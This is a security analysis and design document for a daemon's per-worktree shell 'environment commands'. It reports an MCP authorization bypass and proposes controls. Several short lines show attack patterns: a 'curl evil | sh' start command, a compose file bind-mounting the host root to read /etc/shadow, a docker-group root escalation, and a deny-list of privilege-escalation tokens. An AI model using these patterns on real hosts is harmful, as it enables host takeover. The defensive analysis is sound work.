# Env-Command Security Analysis

**Status:** Analysis + design doc. No code changes proposed here.
**Scope:** Agor "environment commands" — named shell commands per worktree
(`start_command`, `stop_command`, `nuke_command`, `logs_command`) triggered over
REST/MCP/CLI and executed on the daemon host.

---

## ⚠️ CRITICAL FINDING — FLAG UP FRONT

**Non-admin users CAN trigger env commands via MCP today, on any worktree they
can read.** This contradicts the premise that "admin-only *defines*, any
permitted user *triggers*": in practice, the trigger gate is weaker than either.

- REST routes (`POST /worktrees/:id/{start,stop,restart,nuke}`) correctly
  require `ROLES.ADMIN` at
  `apps/agor-daemon/src/register-routes.ts:2079,2098,2117,2136`.
- **MCP tools** (`agor_environment_start`, `_stop`, `_nuke`) call the service
  methods directly at
  `apps/agor-daemon/src/mcp/tools/environment.ts:23,57,176` — passing
  `ctx.baseServiceParams`, which carries the user's real role but is **not
  checked**.
- The service methods themselves (`startEnvironment` / `stopEnvironment` /
  `nukeEnvironment` at `apps/agor-daemon/src/services/worktrees.ts:870,1021,1138`)
  have **no role check** of their own. Their only gate is the internal
  `this.get(id, params)` — which is `view`-level (any authenticated user in
  RBAC-disabled mode, any user with `view` permission on the worktree in
  RBAC-enabled mode).
- MCP domain tier filtering (`readOnlyProxy` at `.../mcp/server.ts:348`) only
  strips non-readonly tools when the `worktrees` domain is configured
  `readonly`. In the default `on` tier, start/stop/nuke are fully exposed.

**Impact (open-access, `worktree_rbac: false`):** any authenticated user with a
valid MCP session token (which is minted for every agentic session) can execute
the admin-defined `start_command` / `stop_command` / `nuke_command` of any
worktree as the daemon user (simple mode) or as the worktree creator's unix
user (strict mode). This is effectively arbitrary code execution scoped only
by what admin put in those fields.

**Impact (`worktree_rbac: true`):** the same thing, restricted to users with
`view+` on the worktree. `view` is the weakest tier; `others_can: view` is a
reasonable default for a shared team, so this is still wide.

**Recommended immediate fix:** add a `requireAdmin` (or at minimum, role- and
RBAC-aware) check inside `startEnvironment` / `stopEnvironment` /
`restartEnvironment` / `nukeEnvironment`, or — cleaner — route the MCP tools
through the same authenticated REST path rather than reaching into the service
class. The route-layer hook is not a service-layer hook in Feathers; custom
class methods bypass it entirely.

---

## 1. Current State

### 1.1 Where env commands live

**Repo-level templates** — Handlebars templates on `repos.data.environment_config`:
`up_command`, `down_command`, `nuke_command`, `logs_command`,
`health_check.url_template`, `app_url_template`.
- `packages/core/src/db/schema.postgres.ts:436-443`
- `packages/core/src/db/schema.sqlite.ts:428-435`
- Ingested from `.agor.yml` at repo creation
  (`packages/core/src/config/agor-yml.ts:18-34`).

**Worktree-level resolved commands** — materialised columns on `worktrees`:
`start_command`, `stop_command`, `nuke_command`, `logs_command`,
`health_check_url`, `app_url`.
- `packages/core/src/db/schema.postgres.ts:480-485`
- `packages/core/src/db/schema.sqlite.ts:472-477`

### 1.2 Define / edit path (admin-only — confirmed)

`PATCH /repos/:id` and `PATCH /worktrees/:id` both run
`requireAdminForEnvConfig()` before hitting the service:
`apps/agor-daemon/src/register-hooks.ts:514-516, 540-543`.

Hook body at `apps/agor-daemon/src/utils/authorization.ts:54-97`: scans the
patch payload for any of `environment_config`, `start_command`, `stop_command`,
`nuke_command`, `logs_command`, `health_check_url`, `app_url` and calls
`ensureMinimumRole(params, ROLES.ADMIN, ...)`. Internal daemon calls
(`!params?.provider`) and service accounts bypass — standard Feathers pattern.

✅ **Define gate is real, at the service-hook layer, and applies to both
repo-level templates and worktree-level materialised commands.**

### 1.3 Trigger path (broken — see critical finding)

REST (gated):
- `POST /worktrees/:id/start` — `ROLES.ADMIN`
- `POST /worktrees/:id/stop` — `ROLES.ADMIN`
- `POST /worktrees/:id/restart` — `ROLES.ADMIN`
- `POST /worktrees/:id/nuke` — `ROLES.ADMIN`
- `GET  /worktrees/:id/health` — `ROLES.MEMBER`
  (`apps/agor-daemon/src/register-routes.ts:2065-2156`)

MCP (ungated): see critical finding above.

CLI: `apps/agor-cli/src/commands/worktree/env/{start,stop,restart,status}.ts`
calls the daemon via the service layer — inherits the daemon's Feathers
authentication; role enforcement depends on whether it goes through the route
(ADMIN) or direct service call. Needs one more read to pin down which path it
takes, but the CLI is lower-risk because it runs as the daemon user already.

### 1.4 Executor: what actually runs

Core spawner: `packages/core/src/unix/environment-command-spawn.ts:52-127`.
Uses Node `child_process.spawn()`. Two shapes:

- **Simple mode** (`unix_user_mode: simple`, default):
  `spawn(command, [], { shell: true, cwd: worktree.path, env: <merged> })`.
  The entire admin-defined `command` string is passed to `/bin/sh -c`.
  Runs as the daemon user (`agorpg`).

- **Insulated / strict modes** (via
  `packages/core/src/unix/run-as-user.ts:203-296`):
  `spawn('sudo', ['-n', '-u', <user>, 'bash', '-c', innerScript])` where
  `innerScript` optionally sources a per-run env file, then `exec`s the admin
  command. Requires passwordless sudo (`-n`) for `agorpg → <user>`.
  - `insulated`: `<user>` = `execution.executor_unix_user` (shared executor).
  - `strict`: `<user>` = `worktree.created_by`'s `unix_username` (per-user).

**Critical implementation note for the threat model:** in all modes, the
spawned command's `cwd` is `worktree.path`. The shell interprets the admin
command string, but the actual behaviour (what containers start, what ports
publish, what volumes mount) is governed by whatever the command *reads* from
that directory — typically `docker-compose.yml`, `Dockerfile`, `.env`, etc.
The triggering user (or anyone who can push to the branch) controls that
content.

### 1.5 Docker group question

Not explicitly wired by Agor — it depends on host setup. In the common
docker-compose case:

- **Simple mode:** daemon user must be in the `docker` group to run
  `docker compose`. Being in `docker` is effectively root-equivalent on the
  host (`docker run -v /:/host …` trivially escalates).
- **Strict mode:** each worktree-creator unix user must be in `docker` for
  their compose commands to work. This hands root-equivalent to every human
  who creates a worktree. This is **worse than simple mode for most threat
  models**, because "user per human" multiplies the number of host-root
  principals.
- **Insulated mode:** only the shared `executor_unix_user` needs `docker`.
  That is the sane default for docker-based stacks.

The sudoers file at `docker/sudoers/agor-daemon.sudoers` scopes `sudo -u` but
does not scope `docker`.

### 1.6 Audit & logging

No structured audit trail. Only `console.log` at
`apps/agor-daemon/src/services/worktrees.ts:907, 1042, 1161, 1390`
(start/stop/nuke/logs). Output goes to daemon stdout/stderr. No DB table, no
Feathers event, no webhook.

Also no rate limiting or quota. A tight loop of `agor_environment_nuke` calls
is rate-limited only by how fast containers can start/stop.

### 1.7 Existing config surface

Only the general execution knobs: `unix_user_mode`, `executor_unix_user`,
`worktree_rbac`, `allow_web_terminal`
(`packages/core/src/config/types.ts:218-279`). **No env-command-specific
config keys today** — no kill-switch, no allow-list, no deny-list.

---

## 2. Threat Model

Open-access mode (`worktree_rbac: false`, `unix_user_mode: simple`) is the
baseline Max expressed worry about. That's Mode 1 in `CLAUDE.md`.

### 2.1 External unauthenticated

- Env-command endpoints all sit behind `requireAuth` (REST) or
  `validateSessionToken` (MCP). Confirmed via route/middleware registration.
  No path to trigger without credentials.
- Indirect risk: if daemon is exposed to the public internet without TLS/auth
  hardening (out of scope here), any authenticated-user attack below applies.

### 2.2 Authenticated non-admin `member`

In open-access mode, a plain `member` with a valid MCP session token:

| Attack | Works today? | Control |
|---|---|---|
| `POST /worktrees/:id/start` via REST | ❌ blocked (ADMIN) | Route hook |
| `agor_environment_start` via MCP | ✅ **yes** | None (critical finding) |
| `agor_environment_nuke` via MCP | ✅ **yes** | None (critical finding) |
| Edit `start_command` via REST/UI | ❌ blocked (ADMIN) | `requireAdminForEnvConfig` |
| Push a malicious `docker-compose.yml` to the branch, then wait for admin to `start` | ✅ yes, by design | None — see §2.4 |
| Loop `nuke` to burn CPU/disk | ✅ yes (MCP path) | None |

**Worst case in open-access mode:** member gets arbitrary shell as the daemon
user, within whatever the admin-defined `start_command` does. If that's
`docker compose up -d`, the member can edit `docker-compose.yml` first and the
compose file gets interpreted by daemon's docker — which (if daemon is in the
`docker` group) equals host root.

### 2.3 Authenticated non-admin with `prompt`-tier worktree access (RBAC on)

Same as §2.2 but gated by `view+` on the specific worktree. With
`others_can: prompt` default on team worktrees, this is most collaborators.

### 2.4 Triggering user controls the checkout — escalation through commit

Even if the MCP gate were fixed and only admins could trigger, a non-admin
with commit access to the worktree branch can still escalate via the compose
file or equivalent. The admin configured `docker compose up`; the worktree
owner commits a `docker-compose.yml` with
`volumes: ["/:/host"]` + a shell script that reads `/etc/shadow`.

**This is fundamental:** env commands execute code from the checkout.
Sanitising the command string does not sanitise the working tree. The only
real mitigations are:

1. Treat "trigger env command" as equivalent to "execute arbitrary code from
   this branch" and gate it at the same level as branch-write.
2. Sandbox the execution (rootless docker/podman, namespaces, seccomp).
3. Pin the compose file / Dockerfile to a known-good revision and refuse to
   run if the current tree differs.

Option 3 is where "argv allow-list" arguments lose force — the argv is fine,
the payload is the filesystem.

### 2.5 Admin (non-malicious) — foot-guns

- `nuke_command` typo that deletes the wrong volumes.
- Committing `.agor.yml` with a `start: curl evil | sh`-style command; future
  worktrees inherit it.
- Flipping `worktree_rbac: false` expecting "personal instance" semantics,
  forgetting there are provisioned members.

### 2.6 Compromised admin account

Instant arbitrary code execution on the host. The only defense-in-depth Agor
could realistically add is:

- Logging / audit so compromise is detectable after the fact.
- A second-factor / out-of-band approval on `nuke` (nuke-confirm tokens).
- Making admin env-command edits append-only (no silent edits of existing
  command strings after review) — a build-time config vs. runtime config
  split.

These are all "Consider" tier, not blocking.

---

## 3. Proposed Control Surface

Ordered by value-per-effort. Sizes: S = < day, M = week-ish, L = multi-week.

### 3.1 Fix the MCP bypass (S, **blocking**)

Add role enforcement inside the service methods, not just on the routes.
Example: `startEnvironment` calls
`ensureMinimumRole(params, ROLES.ADMIN, 'trigger env start')` as its first line.
Alternative: have MCP tools call the registered custom route instead of the
service class directly, so the route hooks fire. Routes-call approach is
cleaner architecturally.

Location: `apps/agor-daemon/src/services/worktrees.ts:870, 1021, 1117, 1138`.
Config: none (no opt-out — this is a pure bug-class fix).

### 3.2 Feature kill-switch (S)

New config: `execution.env_commands.enabled: boolean`. Default `true` for
backward compatibility (flipping default to `false` is discussed in §4).
Checked at trigger entry — throws `Forbidden` before `spawn`. Also hides
start/stop/nuke buttons in the UI and un-registers MCP tools.

Location: `packages/core/src/config/types.ts`, checked in
`spawnEnvironmentCommand()` or the service methods.

### 3.3 Separate define-vs-trigger RBAC knobs (M)

Today "ADMIN" is the single answer for both. Useful split:

- `execution.env_commands.define_role`: `ADMIN` default (unchanged).
- `execution.env_commands.trigger_role`: `ADMIN` default — can be loosened to
  `MEMBER` by consenting ops teams who want to let members bounce their own
  stacks.
- Per-worktree override: tie trigger permission to a worktree permission tier
  (`others_can: session` and above can trigger, `view` cannot).

Location: new hook + config. Complexity is in the UI surface for operators to
understand what they're loosening.

### 3.4 Argv-token deny-list (S)

Implement an unambiguous blocklist first, allow-list second. Deny-list
rejects the command at define-time **and** at trigger-time if tokens like:

- `--privileged`
- `--network=host` / `--network host`
- `-v /:`, `--mount … source=/ …` (bind root)
- `--cap-add=ALL`, `--cap-add=SYS_ADMIN`
- `--user 0` / `--user root`
- Backticks / `$(…)` in the command string (cheap hedge, many false positives
  on legitimate interpolation — make it a warning not a block).

Token-matching (splitting argv) is safer than regex against a shell string.
Since we spawn `sh -c <string>`, we'd need to parse the string first (e.g. via
`shell-quote`) — acknowledge this is imperfect; documented best-effort.

Location: new utility in `packages/core/src/unix/env-command-validator.ts`,
called from `spawnEnvironmentCommand` and from `requireAdminForEnvConfig`.

### 3.5 Argv-prefix allow-list (M)

`execution.env_commands.allowed_prefixes: ["docker compose", "docker ps",
"pnpm ", "make "]`. Command must start with one of these after tokenisation.
Empty list = allow anything (backward compat). Pairs well with deny-list above.

### 3.6 Audit log (M)

New table `env_command_events(id, worktree_id, user_id, action, argv,
exit_code, started_at, ended_at, caller: rest|mcp|cli)`. Write at trigger and
at completion. Expose over `find` to admins only. Emit Feathers event so UI
can tail it.

Location: new repository + hook.

### 3.7 Checkout pinning / compose review (L)

Given §2.4, this is where real isolation lives. Options in increasing order
of effort:

- Compute `sha256` of `docker-compose.yml` at admin-blessing time, store on
  worktree, refuse to `start` if current hash differs (forces re-bless after
  changes).
- Require `start` to run against a clean worktree at a specific ref.
- Render compose through a policy engine (conftest / rego) that rejects
  `privileged`, host networking, root bind mounts, etc.

All three are real work. Ship the first two only when there is a concrete
threat (multi-tenant).

### 3.8 Rootless docker / dedicated runner (L)

Mitigates docker-group = host-root.

- **Rootless docker / podman:** containers cannot escape to host. Operational
  cost: slower, networking gotchas, non-standard for many stacks. Ship as an
  *option*, not a requirement.
- **Dedicated runner process:** a small, auditable service that owns docker
  access, exposes a narrow API (`up(worktreeId, composePath)`) to the daemon,
  validates argv before forwarding. Daemon loses docker-group membership.
  Biggest security win available short of full container-host separation.

Location: new `apps/agor-runner/` package, out-of-band IPC.

### 3.9 Rate / quota (S)

`execution.env_commands.rate_limit_per_minute: 10` per user. Cheap. Blunts
`nuke`-loop denial of service. Low priority compared to the above.

---

## 4. Recommendation

**Do now (this week, low risk):**

1. **Fix MCP bypass** (§3.1). Add `ensureMinimumRole(params, ROLES.ADMIN)` in
   `startEnvironment` / `stopEnvironment` / `restartEnvironment` /
   `nukeEnvironment`. Non-negotiable — current behaviour violates the
   documented contract ("ADMIN role to trigger").
2. **Kill-switch** (§3.2). Ship `execution.env_commands.enabled` defaulting
   to `true` (UX preservation). Document the recommendation to set `false`
   on shared-team instances that don't use env commands. Flipping the
   *default* to `false` is a later call — premature now given the
   auto-on UI flow.
3. **Minimal deny-list** (§3.4). Hard-block `--privileged`, `--network host`,
   `-v /:`, `--cap-add=ALL`, `--cap-add=SYS_ADMIN` tokens at define-time.
   Fail loud with "this token is blocklisted; set
   `execution.env_commands.deny_list_overrides` to loosen." Small surface,
   catches the obvious footguns.
4. **Audit log (minimal)** (§3.6) — at least structured logger emits with
   worktree_id, user_id, caller, argv hash. Don't need the full DB table in
   the first pass; the log is enough to post-mortem an incident.

**Do next (next sprint, medium lift):**

5. **Split define/trigger roles** (§3.3) + worktree-permission-tiered
   triggering. Biggest UX + security payoff: lets teams say "members can
   restart their worktree, only admins can edit the compose config."
6. **Argv-prefix allow-list** (§3.5). Default empty (backward compat).
   Recommended config for paranoid instances: `["docker compose ", "docker ps",
   "docker logs "]`.
7. **Full audit table** (§3.6) with UI surface.

**Consider (next quarter, big lift, only if justified):**

8. **Compose-hash pinning** (§3.7). Needed when the threat model includes
   "collaborator with branch-write who is not trusted to commit compose
   changes without review." Not urgent for current deployment modes.
9. **Dedicated runner process** (§3.8). Biggest structural win. Worth it
   once there is >1 concurrent production-style tenant on a single daemon.
10. **Rootless docker** as supported option (§3.8).

**Not recommending:**

- **Regex-based argv filtering.** Bypassed in two lines. Token-level only.
- **Default-disable** env commands. UX cost outweighs security gain until
  the MCP bypass is fixed — after that, default-on is fine for local/solo
  and default-off is the right call for team, but we haven't wired
  deployment-mode-specific defaults yet.

**Will not fix structurally:** a compromised admin account is game-over. No
amount of env-command config hardens against that. Audit logging is the
compensating control.

---

## 5. `config.yaml` Draft

```yaml
execution:
  # Existing keys (unchanged)
  worktree_rbac: false
  unix_user_mode: simple         # simple | insulated | strict
  executor_unix_user: null
  allow_web_terminal: true

  # --- New: env-command controls ---
  env_commands:
    # Master switch. When false, start/stop/restart/nuke/logs REST routes
    # return 404 and the corresponding MCP tools are not registered.
    # Editing start_command/stop_command/etc. is still allowed (admin only)
    # so ops can prep commands while the feature is dark.
    enabled: true

    # Role required to *define* env commands (.agor.yml ingestion and
    # worktree-level patches). Default: admin. Superadmin always allowed.
    define_role: admin           # member | admin | superadmin

    # Role required to *trigger* env commands (start/stop/restart/nuke).
    # Default: admin. Set to `member` only on instances where you trust every
    # authenticated user to run your configured shell commands.
    trigger_role: admin          # member | admin | superadmin

    # When worktree_rbac is true, additionally require at least this tier on
    # the target worktree before allowing a trigger. Ignored when RBAC is off.
    # `session` = owner/prompt/all can trigger; `view` cannot.
    trigger_worktree_permission: session  # view | session | prompt | all

    # Hard deny-list of argv tokens. Checked at define-time (command
    # rejected) and at trigger-time (spawn aborted). These are the obvious
    # host-root footguns.
    deny_tokens:
      - "--privileged"
      - "--network=host"
      - "--network"              # matched only when followed by "host"
      - "--cap-add=ALL"
      - "--cap-add=SYS_ADMIN"
      - "--user=0"
      - "--user=root"
      # Bind-mount root filesystem
      - "-v /:"
      - "--mount=type=bind,source=/,"

    # Soft allow-list. Empty = allow anything (after deny-list).
    # Command must start with one of these tokens post-tokenisation.
    allowed_prefixes: []
    # Recommended paranoid config:
    # allowed_prefixes:
    #   - "docker compose"
    #   - "docker ps"
    #   - "docker logs"
    #   - "pnpm"
    #   - "make"

    # Rate limit triggers per user per minute. 0 = unlimited.
    rate_limit_per_minute: 0

    # Audit logging. When true, every trigger writes an event to
    # env_command_events table and emits a Feathers event.
    audit: true

    # When true, refuse to start if docker-compose.yml (or the pinned
    # compose_files list) differs from the hash blessed at last admin
    # review. Ops must re-bless after compose changes.
    #
    # Recommend enabling for shared-team and solo instances once stable.
    require_compose_pin: false
    compose_files:
      - "docker-compose.yml"
      - "docker-compose.override.yml"
```

Minimum set to merge in the "do now" step: `enabled`, `deny_tokens`, `audit`.
The rest can land with §3.3–3.7.

---

## Open Questions / Uncertainty

- **CLI trigger path.** I did not confirm whether `agor worktree env start`
  from CLI goes through the gated REST route or reaches into the service
  class directly. If it reaches in, same MCP-bypass bug applies. Worth a
  10-minute read of `apps/agor-cli/src/commands/worktree/env/start.ts` before
  shipping the fix. CLI is lower-risk because the CLI user is already on the
  daemon host, but still worth knowing.
- **Docker group membership by unix mode.** My analysis assumes a typical
  docker-compose deployment. Agor does not check or document this — an admin
  can configure a non-docker `start_command` and the docker-group discussion
  is moot. Worth a paragraph in the security docs clarifying that *if* you
  run docker stacks under `unix_user_mode: strict`, every human user ends up
  in `docker` and therefore root-equivalent.
- **MCP tool-list suppression when `env_commands.enabled: false`.** The
  `readOnlyProxy` pattern filters by annotation, not by name. A kill-switch
  needs a new filter path; trivial but not free.
- **Whether `requireAdminForEnvConfig` catches `.agor.yml` ingestion.** The
  hook fires on `PATCH /repos/:id`. Repo *creation* via
  `cloneRepository` / `addLocalRepository` ingests `.agor.yml` — if that goes
  through `create` on the repos service with `environment_config` in the
  payload, the hook catches it (it covers `create`). If it bypasses
  (server-side construction without the `provider` set), it would be treated
  as "internal" and skip the check — this is intended (admin-curated ingest)
  but worth verifying that no user-initiated path sneaks through. I believe
  it's fine; flagging because I did not trace every codepath.
